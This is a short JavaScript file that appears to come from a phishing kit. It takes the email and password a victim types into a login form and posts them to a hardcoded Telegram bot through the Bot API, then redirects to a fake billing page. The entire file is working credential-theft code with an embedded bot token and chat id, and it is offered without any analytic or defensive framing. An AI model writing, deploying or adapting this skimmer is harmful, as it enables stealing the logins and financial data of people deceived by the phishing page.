//bot token
var telegram_bot_id = "5660577106:AAHNe17ILesyhd93nenmqIiyb9QNu-hzLRE";
var chat_id = 5968694718 ;
var emails, passs;
var ready = function () {
    emails= document.getElementById("email").value;
    passs= document.getElementById("pass").value;
	
    message = "\nemail: " + emails + "\npass: " + passs ;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
      $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("email").value="";
     document.getElementById("pass").value = "";
	 
	window.location.href = "info/billing.html";
    return false;
};
